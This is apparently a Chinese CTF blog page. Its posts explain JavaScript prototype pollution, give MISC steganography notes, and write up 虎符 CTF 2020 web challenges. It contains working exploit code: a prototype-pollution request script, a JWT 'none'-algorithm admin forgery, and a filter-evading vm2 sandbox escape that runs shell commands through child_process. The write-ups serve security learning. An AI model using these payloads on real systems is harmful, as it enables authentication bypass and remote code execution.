              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/CTF比赛/" itemprop="url" rel="index"><span itemprop="name">CTF比赛</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>2.5k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>2 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="什么是原型链"><a href="#什么是原型链" class="headerlink" title="什么是原型链"></a>什么是原型链</h2><p>​        JavaScript常被称为基于原型的语言，也就是说js中没有类，在继承时候只有一种结构那就是对象（ <strong>object</strong> ）。每个对象都有一个私有属性那就是<code>__proto__</code>,而<code>__proto__</code>又会指向它的构造函数的原型对象（<strong>prototype</strong> ）一直到一个对象的原型对象为 <code>null</code>为止。</p>
<p>​        用一个不是很恰当的例子说明：</p>
<p>​        鸡生蛋，其中生蛋这个过程我们称之为<strong>构造函数</strong>，而鸡我们称为蛋的<strong>原型</strong>，而蛋孵出的小鸡又生小鸡，那么蛋又成为了小鸡的原型。</p>
<p>​        我们通过蛋的DNA又可以找到生他的母鸡，用母鸡的DNA又可找到<code>生母鸡的母鸡</code>，<code>母鸡的母鸡</code>的DNA又可以找到<code>生他母鸡的母鸡</code>这种类似家族的关系我们就称之为<strong>原型链</strong>。</p>
<p>​        原型链它又不是无限的，你在不断朔源他的家族最终会发现他的祖宗是宇宙大爆炸时候的奇点，而这个奇点不是鸡也不是蛋，也就是最终指向<code>null</code>.而鸡是乌鸡那他生的蛋孵出的小鸡也会是黑色的，这样的<code>遗传</code>关系我们称之为<strong>继承</strong>。</p>
<p><img src="http://goodcheerleung.gitee.io/blog/1.png" alt="img"></p>
<h2 id="什么是原型链污染"><a href="#什么是原型链污染" class="headerlink" title="什么是原型链污染"></a>什么是原型链污染</h2><p>​        我们先来看一段代码,我们设置一个类parent内有a、b属性，我们给parent设置一个属性c赋值为‘3’。我们再设置一个类child内有a、b属性，并让child的原型为parent，我们实例化一个类child赋给s，输出对象s中的c属性发现其输出了3。这是为什么呢？</p>
<p><img src="http://goodcheerleung.gitee.io/blog/2.png" alt="img"></p>
<p>​        要理解这点有一个很重要的概念就是<strong>原型链变量搜索</strong>，我们要输出一个对象的某个属性如果在这个对象中不存在这个属性，就会在他的上层原型中搜索，遍历完这条原型链直到null为止。所以这条原型链其实是这样的：</p>
<p><img src="http://goodcheerleung.gitee.io/blog/3.png" alt="img"></p>
<p>​        </p>
<p>​        下面我们以一个实际案例来讲解原型链污染,这是hackit 2018中的一道原型链污染的题目，以下是我摘要下来的代码（文末奉上链接），代码中<code>user.admintoken</code>是不存在的。那么我们要怎么让<code>md5(user.admintoken) === req.query.querytoken</code>条件成立呢？</p>
<pre><code class="javascript">var user=[];
app.get(&#39;/admin&#39;, (req, res) =&gt; { 
    /*this is under development I guess ??*/
    console.log(user.admintoken);
    if(user.admintoken &amp;&amp; req.query.querytoken &amp;&amp; md5(user.admintoken) === req.query.querytoken){
        res.send(&#39;Hey admin your flag is &lt;b&gt;flag{prototype_pollution_is_very_dangerous}&lt;/b&gt;&#39;);
    } 
    else {
        res.status(403).send(&#39;Forbidden&#39;);
    }    
}
)
app.post(&#39;/api&#39;, (req, res) =&gt; {
    var client = req.body;
    var winner = null;
    matrix[client.row][client.col] = client.data;
    }</code></pre>
<p>​        我们发现<code>matrix[client.row][client.col] = client.data;</code>进行了一个赋值操作，client对象我们是可以控制的，上面我们说了每个对象都有一个私有属性<code>__proto__</code>,那么我们能不能控制<code>matrix</code>对象的原型从而控制<code>user.admintoken</code>呢？</p>
<p><img src="http://goodcheerleung.gitee.io/blog/4.png" alt="img"></p>
<p>​        从上我们在本地测试的结果来看是可以成功控制user的。这里我们也可以知道原型链污染的条件就是要能够控制键名。</p>
<p>而最终的exp是：</p>
<pre><code class="python">import requests
r = requests.post(&#39;http://target/api&#39;,json={&#39;row&#39;:&#39;__proto__&#39;,&#39;col&#39;:&#39;admintoken&#39;,&#39;data&#39;:&#39;qqq&#39;})
r = requests.get(&#39;http://target/admin?querytoken=&#39; + md5sumhex(&#39;qqq&#39;))
print r.text</code></pre>
<p>​        我们在来看大佬们一个简单的类，这也是大佬们经常举的例子：</p>
<pre><code class="javascript">function merge(target, source) {
for (let key in source) {
    if (key in source &amp;&amp; key in target) {
        merge(target[key], source[key])
    } else {
        target[key] = source[key]
        }
    }
}</code></pre>
<p>​        这是一个对对象进行合并的类我们在本地做个小实验看看能不能进行原型链污染，这里我们可以看到键名是可以被控制的。</p>
<p><img src="http://goodcheerleung.gitee.io/blog/5.png" alt="img"></p>
<p>​        我们发现在s中没有b这个属性？，我们将test2的原型和s的原型分别输出来。</p>
<p><img src="http://goodcheerleung.gitee.io/blog/6.png" alt="img"></p>
<p>​        我们可以发现s的原型直接是object所以在原型链搜索时候直接从object-&gt;null了。而test2上层原型却是一个对象，这个对象的再上层才是object。这是因为在创建字典时候<code>__proto__</code>不是当做键名处理而是作为<code>__proto__</code>给他的父类进行了赋值，所以<code>test2.__proto__</code>中存在b属性。那么要怎么样才能成功污染object呢？我们直接在前面加一个JSON.parse即可（把一个json字符串 转化为 javascript的object）。</p>
<p><img src="http://goodcheerleung.gitee.io/blog/7.png" alt="img"></p>
<h2 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h2><p>​        本人水平有限，难免出现纰漏和理解错误的地方。希望大佬们能够批评指出。</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html#0x01-prototype__proto" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html#0x01-prototype__proto</a>__</p>
<p><a href="https://www.anquanke.com/post/id/176884#h3-5" target="_blank" rel="noopener">https://www.anquanke.com/post/id/176884#h3-5</a></p>
<h2 id="资源"><a href="#资源" class="headerlink" title="资源"></a>资源</h2><p><strong>Republic_of_Gayming</strong>：<a href="https://github.com/DefConUA/HackIT2018/tree/master/web/Republic_of_Gayming" target="_blank" rel="noopener">https://github.com/DefConUA/HackIT2018/tree/master/web/Republic_of_Gayming</a></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://www.plasf.cn/articles/d430b53b04.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/header.jpg">
      <meta itemprop="name" content="XiaoLeung">
      <meta itemprop="description" content="随笔、分享、记录生活">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Xiao Leung's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/articles/d430b53b04.html" class="post-title-link" itemprop="url">MISC专项训练笔记</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2020-04-22 23:02:10" itemprop="dateCreated datePublished" datetime="2020-04-22T23:02:10+08:00">2020-04-22</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2020-10-14 17:14:09" itemprop="dateModified" datetime="2020-10-14T17:14:09+08:00">2020-10-14</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/CTF比赛/" itemprop="url" rel="index"><span itemprop="name">CTF比赛</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>1.6k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>1 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="MRCTF2020-不眠之夜"><a href="#MRCTF2020-不眠之夜" class="headerlink" title="[MRCTF2020]不眠之夜"></a>[MRCTF2020]不眠之夜</h2><p><img src="http://goodcheerleung.gitee.io/mycute/20200422/15875492048718.png" alt="img"></p>
<p>一堆乱七八糟的图片。直接用montage合成一张图。</p>
<pre><code class="shell">montage *.jpg -geometry +0+0+0 ok.jpg</code></pre>
<p><img src="http://goodcheerleung.gitee.io/mycute/20200422/15875497047175.jpg" alt="img"></p>
<pre><code>gaps --image=ok.jpg --generations=50 --population=120 --size=50</code></pre><p>出来flag</p>
<p><img src="http://goodcheerleung.gitee.io/mycute/20200422/15875505799743.png" alt="img"></p>
<h2 id="MRCTF2020-你能看懂音符吗"><a href="#MRCTF2020-你能看懂音符吗" class="headerlink" title="[MRCTF2020]你能看懂音符吗"></a>[MRCTF2020]你能看懂音符吗</h2><p>压缩包打开失败…于是猜测文件损坏。用010打开，docx映入眼帘，同时文件头被修改，改回来RAR即可。</p>
<p><img src="http://goodcheerleung.gitee.io/mycute/20200422/1587550972340.png" alt="img"></p>
<p>用word打开显示隐藏文字得到：</p>
<pre><code>♭♯♪‖¶♬♭♭♪♭‖‖♭♭♬‖♫♪‖♩♬‖♬♬♭♭♫‖♩♫‖♬♪♭♭♭‖¶∮‖‖‖‖♩♬‖♬♪‖♩♫♭♭♭♭♭§‖♩♩♭♭♫♭♭♭‖♬♭‖¶§♭♭♯‖♫∮‖♬¶‖¶∮‖♬♫‖♫♬‖♫♫§=</code></pre><p><a href="https://www.qqxiuzi.cn/bianma/wenbenjiami.php?s=yinyue" target="_blank" rel="noopener">千千字</a>秀解密得到：</p>
<pre><code>MRCTF{thEse_n0tes_ArE_am@zing~}</code></pre><h2 id="MRCTF2020-寻找xxx"><a href="#MRCTF2020-寻找xxx" class="headerlink" title="[MRCTF2020]寻找xxx"></a>[MRCTF2020]寻找xxx</h2><p>打开电话拨号声，不用想直接扔<a href="https://github.com/hfeeki/dtmf" target="_blank" rel="noopener">dtmf</a>读取出来，然后手动去重，因为有干扰声。</p>
<p>18684221609</p>
<h2 id="MRCTF2020-Hello-misc"><a href="#MRCTF2020-Hello-misc" class="headerlink" title="[MRCTF2020]Hello_ misc"></a>[MRCTF2020]Hello_ misc</h2><p>binwalk分离出来一个加密的压缩包。爆破无果。</p>
<p>用StegSolve图片中分离出一张图片得到密码：</p>
<p><img src="http://goodcheerleung.gitee.io/mycute/20200422/15875597586078.png" alt="img"></p>
<p><img src="http://goodcheerleung.gitee.io/mycute/20200422/15875598279919.png" alt="img"></p>
<p>解压出来是TTL.用脚本转换为字符</p>
<pre><code class="python">import re

txt = open(&quot;out.txt&quot;,&#39;r&#39;)
line = txt.readlines()
number = []
flag = &quot;&quot;
for i in line:
    number.append(int(i))
for i in number:
    if(i == 63):
        flag += &quot;00&quot;
    elif(i == 127):
        flag += &quot;01&quot;
    elif(i == 191):
        flag += &quot;10&quot;
    else:
        flag += &quot;11&quot;
strr = re.findall(r&#39;.{8}&#39;, flag)
for i in strr:
    print(chr(int(i,2)),end=&quot;&quot;)</code></pre>
<p>得到密码<code>0ac1fe6b77be5dbe</code> 压缩包里面再得到一个word，文字全部变成黑色得到：</p>
<pre><code>MTEwMTEwMTExMTExMTEwMDExMTEwMTExMTExMTExMTExMTExMTExMTExMTExMTExMTAxMTEwMDAwMDAxMTExMTExMTExMDAxMTAx
MTEwMTEwMTEwMDAxMTAxMDExMTEwMTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTAxMTExMTExMTExMTExMTEwMTEwMDEx
MTEwMDAwMTAxMTEwMTExMDExMTEwMTExMTExMTAwMDExMTExMTExMTExMDAxMDAxMTAxMTEwMDAwMDExMTExMDAwMDExMTExMTEx
MTEwMTEwMTAwMDAxMTExMDExMTEwMTExMTExMDExMTAxMTExMTExMTEwMTEwMTEwMTAxMTExMTExMTAwMTEwMTExMTExMTExMTEx
MTEwMTEwMTAxMTExMTExMDExMTEwMTExMTAxMDExMTAxMTExMTExMTEwMTEwMTEwMTAxMTAxMTExMTAwMTEwMTExMTExMTExMTEx
MTEwMTEwMTAwMDAxMTAwMDAwMTEwMDAwMDAxMTAwMDExMTAwMDAwMTEwMTEwMTEwMTAxMTEwMDAwMDAxMTExMDAwMDExMTExMTEx</code></pre><p>base64隐写，用<a href="https://github.com/jerrita/b64steg" target="_blank" rel="noopener">b64steg</a>解密</p>
<pre><code>b64steg.py -f stego.txt -s out.txt</code></pre><p><img src="http://goodcheerleung.gitee.io/mycute/20200422/1587560232982.png" alt="img"></p>
<h2 id="MRCTF2020-摇滚DJ"><a href="#MRCTF2020-摇滚DJ" class="headerlink" title="[MRCTF2020]摇滚DJ"></a>[MRCTF2020]摇滚DJ</h2><p><a href="https://apktrending.com/apk-android/xdsopl-robot36.html" target="_blank" rel="noopener">Robot36 - SSTV Image Decoder</a> 直接AFSK1200无线电解码。<br><img src="http://goodcheerleung.gitee.io/mycute/20200422/15875614783837.png" alt="img"></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://www.plasf.cn/articles/d5702afe7e.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/header.jpg">
      <meta itemprop="name" content="XiaoLeung">
      <meta itemprop="description" content="随笔、分享、记录生活">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Xiao Leung's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/articles/d5702afe7e.html" class="post-title-link" itemprop="url">虎符 CTF 2020 Write up</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2020-04-20 12:27:54" itemprop="dateCreated datePublished" datetime="2020-04-20T12:27:54+08:00">2020-04-20</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2020-10-14 17:15:06" itemprop="dateModified" datetime="2020-10-14T17:15:06+08:00">2020-10-14</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/CTF比赛/" itemprop="url" rel="index"><span itemprop="name">CTF比赛</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>13k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>11 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="easy-login"><a href="#easy-login" class="headerlink" title="easy_login"></a>easy_login</h1><p><code>/static/js/app.js</code>中有hint提示这个web使用<code>koa-static 来处理静态文件</code></p>
<p><img src="http://goodcheerleung.gitee.io/mycute/20200420/15873489757041.png" alt="img"></p>
<p>猜测存在koa路由配置错误导致根目录的任意文件读取。我们直接读取app.jpg</p>
<pre><code class="http">http://dafd014be0114c23bd9aa2e1a84d01ea772d377a8e974ab5.changame.ichunqiu.com/app.js</code></pre>
<pre><code class="javascript">const Koa = require(&#39;koa&#39;);
const bodyParser = require(&#39;koa-bodyparser&#39;);
const session = require(&#39;koa-session&#39;);
const static = require(&#39;koa-static&#39;);
const views = require(&#39;koa-views&#39;);

const crypto = require(&#39;crypto&#39;);
const { resolve } = require(&#39;path&#39;);

const rest = require(&#39;./rest&#39;);
const controller = require(&#39;./controller&#39;);

const PORT = 80;
const app = new Koa();

app.keys = [crypto.randomBytes(16).toString(&#39;hex&#39;)];
global.secrets = [];

app.use(static(resolve(__dirname, &#39;.&#39;)));

app.use(views(resolve(__dirname, &#39;./views&#39;), {
  extension: &#39;pug&#39;
}));

app.use(session({key: &#39;sses:aok&#39;, maxAge: 86400000}, app));

// parse request body:
app.use(bodyParser());

// prepare restful service
app.use(rest.restify());

// add controllers:
app.use(controller());

app.listen(PORT);
console.log(`app started at port ${PORT}...`);
</code></pre>
<p>根据代码我们知道还有<code>rest.js</code>和<code>controller.js</code></p>
<pre><code class="javascript">module.exports = {
    APIError: function (code, message) {
        this.code = code || &#39;internal:unknown_error&#39;;
        this.message = message || &#39;&#39;;
    },
    restify: () =&gt; {
        const pathPrefix = &#39;/api/&#39;;
        return async (ctx, next) =&gt; {
            if (ctx.request.path.startsWith(pathPrefix)) {
                ctx.rest = data =&gt; {
                    ctx.response.type = &#39;application/json&#39;;
                    ctx.response.body = data;
                };
                try {
                    await next();
                } catch (e) {
                    ctx.response.status = 400;
                    ctx.response.type = &#39;application/json&#39;;
                    ctx.response.body = {
                        code: e.code || &#39;internal_error&#39;,
                        message: e.message || &#39;&#39;
                    };
                }
            } else {
                await next();
            }
        };
    }
};
</code></pre>
<pre><code class="javascript">const fs = require(&#39;fs&#39;);

function addMapping(router, mapping) {
    for (const url in mapping) {
        if (url.startsWith(&#39;GET &#39;)) {
            const path = url.substring(4);
            router.get(path, mapping[url]);
        } else if (url.startsWith(&#39;POST &#39;)) {
            const path = url.substring(5);
            router.post(path, mapping[url]);
        } else {
            console.log(`invalid URL: ${url}`);
        }
    }
}

function addControllers(router, dir) {
    fs.readdirSync(__dirname + &#39;/&#39; + dir).filter(f =&gt; {
        return f.endsWith(&#39;.js&#39;);
    }).forEach(f =&gt; {
        const mapping = require(__dirname + &#39;/&#39; + dir + &#39;/&#39; + f);
        addMapping(router, mapping);
    });
}

module.exports = (dir) =&gt; {
    const controllers_dir = dir || &#39;controllers&#39;;
    const router = require(&#39;koa-router&#39;)();
    addControllers(router, controllers_dir);
    return router.routes();
};
</code></pre>
<p>可以看到<code>controllers</code>应该还还存在<code>api.js</code></p>
<pre><code class="javascript">const crypto = require(&#39;crypto&#39;);
const fs = require(&#39;fs&#39;)
const jwt = require(&#39;jsonwebtoken&#39;)

const APIError = require(&#39;../rest&#39;).APIError;

module.exports = {
    &#39;POST /api/register&#39;: async (ctx, next) =&gt; {
        const {username, password} = ctx.request.body;

        if(!username || username === &#39;admin&#39;){
            throw new APIError(&#39;register error&#39;, &#39;wrong username&#39;);
        }

        if(global.secrets.length &gt; 100000) {
            global.secrets = [];
        }

        const secret = crypto.randomBytes(18).toString(&#39;hex&#39;);
        const secretid = global.secrets.length;
        global.secrets.push(secret)

        const token = jwt.sign({secretid, username, password}, secret, {algorithm: &#39;HS256&#39;});

        ctx.rest({
            token: token
        });

        await next();
    },

    &#39;POST /api/login&#39;: async (ctx, next) =&gt; {
        const {username, password} = ctx.request.body;

        if(!username || !password) {
            throw new APIError(&#39;login error&#39;, &#39;username or password is necessary&#39;);
        }

        const token = ctx.header.authorization || ctx.request.body.authorization || ctx.request.query.authorization;

        const sid = JSON.parse(Buffer.from(token.split(&#39;.&#39;)[1], &#39;base64&#39;).toString()).secretid;

        console.log(sid)

        if(sid === undefined || sid === null || !(sid &lt; global.secrets.length &amp;&amp; sid &gt;= 0)) {
            throw new APIError(&#39;login error&#39;, &#39;no such secret id&#39;);
        }

        const secret = global.secrets[sid];

        const user = jwt.verify(token, secret, {algorithm: &#39;HS256&#39;});

        const status = username === user.username &amp;&amp; password === user.password;

        if(status) {
            ctx.session.username = username;
        }

        ctx.rest({
            status
        });

        await next();
    },

    &#39;GET /api/flag&#39;: async (ctx, next) =&gt; {
        if(ctx.session.username !== &#39;admin&#39;){
            throw new APIError(&#39;permission error&#39;, &#39;permission denied&#39;);
        }

        const flag = fs.readFileSync(&#39;/flag&#39;).toString();
        ctx.rest({
            flag
        });

        await next();
    },

    &#39;GET /api/logout&#39;: async (ctx, next) =&gt; {
        ctx.session.username = null;
        ctx.rest({
            status: true
        })
        await next();
    }
};
</code></pre>
<p>这道题其实是原题，jwt伪造问题和[AngstromCTF 2019]Cookie Cutter一样。</p>
<p>首先我们来了解一下JWT的构成：</p>
<p>JWT例子：</p>
<pre><code>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzZWNyZXRpZCI6MSwidXNlcm5hbWUiOiJhZG1pbiIsInBhc3N3b3JkIjoiYWRtaW4iLCJyb2xsZWQiOiJubyIsImlhdCI6MTU4NzM1MTY0MX0.ljkr86K_y88GP8_9RBzxB2H8CBEK73tNdfDQwmT2eaY</code></pre><p>其实它是以点为界分为三部分。</p>
<pre><code>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9</code></pre><pre><code>eyJzZWNyZXRpZCI6MSwidXNlcm5hbWUiOiJhZG1pbiIsInBhc3N3b3JkIjoiYWRtaW4iLCJyb2xsZWQiOiJubyIsImlhdCI6MTU4NzM1MTY0MX0</code></pre><pre><code>ljkr86K_y88GP8_9RBzxB2H8CBEK73tNdfDQwmT2eaY</code></pre><p>第一部分我们成为头部、第二部分我们称为payload,第二部分我们称之为签证。</p>
<ul>
<li>头部构成主要由两部分，typ声明类型，alg声明加密类型，最后base64编码：</li>
</ul>
<p><img src="http://goodcheerleung.gitee.io/mycute/20200420/15873521703081.png" alt="img"></p>
<ul>
<li>payload</li>
</ul>
<p><img src="http://goodcheerleung.gitee.io/mycute/20200420/15873528037874.png" alt="img"></p>
<ul>
<li>签证由三部分组成<ul>
<li>头（header）basee64</li>
<li>payload  base64</li>
<li>secret</li>
</ul>
</li>
<li>签证拿到上述东西后通过header中加密方式加盐的方式加密形成了签证。</li>
</ul>
<p><img src="http://goodcheerleung.gitee.io/mycute/20200420/15873532192819.png" alt="img"></p>
<p>了解JWT的组成后，我们总结JWT可能存在如下的安全问题：</p>
<blockquote>
<p>1.修改头什么的算法为none</p>
<p>2.若secret较短可以直接使用<a href="https://github.com/brendan-rius/c-jwt-cracker" target="_blank" rel="noopener">c-jwt-cracker</a></p>
<p>3.秘钥泄露</p>
<p>3.修改算法RS256为HS256</p>
</blockquote>
<p>在这道题中明显是修改算法为none进行绕过</p>
<p>构造jwt编写脚本</p>
<pre><code class="javascript">
const crypto = require(&#39;crypto&#39;);
const jwt = require(&#39;jsonwebtoken&#39;);

secretid=0.5;
username=&quot;admin&quot;;
password=&quot;admin&quot;;
rolled=&quot;no&quot;
const secret = crypto.randomBytes(18).toString(&#39;hex&#39;);
const token = jwt.sign({secretid, username, password,rolled}, secret, {algorithm: &#39;none&#39;});
console.log(token);
const sid = JSON.parse(Buffer.from(token.split(&#39;.&#39;)[1], &#39;base64&#39;).toString());
console.log(sid)
</code></pre>
<p>这里绕过需要有一个小trick，先注册一个账号然后再提交上面生成的JWT。SID绕过可以是””或者大于零小于1的数。这是为什么呢。</p>
<p>​        首先要绕过<code>sid === undefined || sid === null || !(sid &lt; global.secrets.length &amp;&amp; sid &gt;= 0</code>j就不能让<code>global.secrets</code>这个数组为<code>undefined</code>，我们需要注册一个账号是的其初始化。</p>
<p>​        其次为什么小于1大于零0呢，我们需要一个<code>global.secrets</code>的值为null,但是如果是0的话就是我们注册那个了，这样的话就会提示需要签名，如果是大于1小于零正好可以绕过第一层检测并且使得值为null。当然如果你注册的账号够多大于1也是可以的。还有就是可以使用空字符串进行绕过，空数组也行，因为nodejs中弱类型比较的关系这个会在下一个文章中重点研究。</p>
<p>最终获得flag:</p>
<p><img src="http://goodcheerleung.gitee.io/mycute/20200420/15873550195855.png" alt="img"></p>
<h1 id="just-escape"><a href="#just-escape" class="headerlink" title="just_escape"></a>just_escape</h1><p>原题nodejs沙箱逃逸，但是对许多函数进行了过滤。</p>
<p>和题中一个操作在issue中一样我们找最新的版本的<a href="https://github.com/patriksimek/vm2/issues/225。" target="_blank" rel="noopener">exp</a>来测试。</p>
<pre><code>(function(){
    TypeError.prototype.get_process = f=&gt;f.constructor(&quot;return process&quot;)();
    try{
        Object.preventExtensions(Buffer.from(&quot;&quot;)).a = 1;
    }catch(e){
        return e.get_process(()=&gt;{}).mainModule.require(&quot;child_process&quot;).execSync(&quot;whoami&quot;).toString();
    }
})()</code></pre><p>但是自己打进去会发现是不行的。我们可以fuzz这个payload有哪些内容是被过滤的。process, exec, eval, constructor, prototype, Function, 加号, 双引号, 单引号被过滤.这里我们可以用<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/template_strings" target="_blank" rel="noopener">模板字符串</a>进行绕过，而属性可以用[模板字符串]代替，而单引号双引号可以用反引号代替。</p>
<pre><code>`${`${`return proces`}s`}`</code></pre><p>最后修改得：</p>
<pre><code class="javascript">(function(){
       TypeError[`${`${`prototyp`}e`}`][`${`${`get_proces`}s`}`] = f=&gt;f[`${`${`constructo`}r`}`](`${`${`return this.proces`}s`}`)();
    try{
         Object.preventExtensions(Buffer.from(``)).a = 1;
    }catch(e){
        return e[`${`${`get_proces`}s`}`](()=&gt;{}).mainModule[`${`${`requir`}e`}`](`${`${`child_proces`}s`}`)[`${`${`exe`}cSync`}`](`whoami`).toString();
    }
})()</code></pre>
<p><img src="http://goodcheerleung.gitee.io/mycute/20200420/15873745251856.png" alt="img"></p>
<h1 id="BabyUpload"><a href="#BabyUpload" class="headerlink" title="BabyUpload"></a>BabyUpload</h1><p>题目直接给了源码：</p>
<pre><code class="php"> &lt;?php
error_reporting(0);
session_save_path(&quot;/var/babyctf/&quot;);
session_start();
require_once &quot;/flag&quot;;
highlight_file(__FILE__);
if($_SESSION[&#39;username&#39;] ===&#39;admin&#39;)
{
    $filename=&#39;/var/babyctf/success.txt&#39;;
    if(file_exists($filename)){
            safe_delete($filename);
            die($flag);
    }
}
else{
    $_SESSION[&#39;username&#39;] =&#39;guest&#39;;
}
$direction = filter_input(INPUT_POST, &#39;direction&#39;);
$attr = filter_input(INPUT_POST, &#39;attr&#39;);
$dir_path = &quot;/var/babyctf/&quot;.$attr;
if($attr===&quot;private&quot;){
    $dir_path .= &quot;/&quot;.$_SESSION[&#39;username&#39;];
}
if($direction === &quot;upload&quot;){
    try{
        if(!is_uploaded_file($_FILES[&#39;up_file&#39;][&#39;tmp_name&#39;])){
            throw new RuntimeException(&#39;invalid upload&#39;);
        }
        $file_path = $dir_path.&quot;/&quot;.$_FILES[&#39;up_file&#39;][&#39;name&#39;];
        $file_path .= &quot;_&quot;.hash_file(&quot;sha256&quot;,$_FILES[&#39;up_file&#39;][&#39;tmp_name&#39;]);
        if(preg_match(&#39;/(\.\.\/|\.\.\\\\)/&#39;, $file_path)){
            throw new RuntimeException(&#39;invalid file path&#39;);
        }
        @mkdir($dir_path, 0700, TRUE);
        if(move_uploaded_file($_FILES[&#39;up_file&#39;][&#39;tmp_name&#39;],$file_path)){
            $upload_result = &quot;uploaded&quot;;
        }else{
            throw new RuntimeException(&#39;error while saving&#39;);
        }
    } catch (RuntimeException $e) {
        $upload_result = $e-&gt;getMessage();
    }
} elseif ($direction === &quot;download&quot;) {
    try{
        $filename = basename(filter_input(INPUT_POST, &#39;filename&#39;));
        $file_path = $dir_path.&quot;/&quot;.$filename;
        if(preg_match(&#39;/(\.\.\/|\.\.\\\\)/&#39;, $file_path)){
            throw new RuntimeException(&#39;invalid file path&#39;);
        }
        if(!file_exists($file_path)) {
            throw new RuntimeException(&#39;file not exist&#39;);
        }
        header(&#39;Content-Type: application/force-download&#39;);
        header(&#39;Content-Length: &#39;.filesize($file_path));
        header(&#39;Content-Disposition: attachment; filename=&quot;&#39;.substr($filename, 0, -65).&#39;&quot;&#39;);
        if(readfile($file_path)){
            $download_result = &quot;downloaded&quot;;
        }else{
            throw new RuntimeException(&#39;error while saving&#39;);
        }
    } catch (RuntimeException $e) {
        $download_result = $e-&gt;getMessage();
    }
    exit;
}
?&gt;</code></pre>
<p>我们直接来看如何能拿到flag；代码中可以看到，首先我们<code>session</code>必须得是<code>admin</code>其次必须存在success.txt</p>
<pre><code class="php">if($_SESSION[&#39;username&#39;] ===&#39;admin&#39;)
{
    $filename=&#39;/var/babyctf/success.txt&#39;;
    if(file_exists($filename)){
            safe_delete($filename);
            die($flag);
    }
}
else{
    $_SESSION[&#39;username&#39;] =&#39;guest&#39;;
}</code></pre>
<p>我们再看第二部分上传的代码,这里有四个重要参数，</p>
<ul>
<li><p><code>direction=upload</code></p>
</li>
<li><p><code>attr</code> 可以对上传路径产生影响</p>
</li>
<li><p>上传的 field是up_file</p>
</li>
<li><p>最后一点是上传文件名会拼接上文件内容本身的sha256，即</p>
</li>
</ul>
<blockquote>
<p>$file_path .= “_”.hash_file(“sha256”,$_FILES[‘up_file’][‘tmp_name’]);</p>
</blockquote>
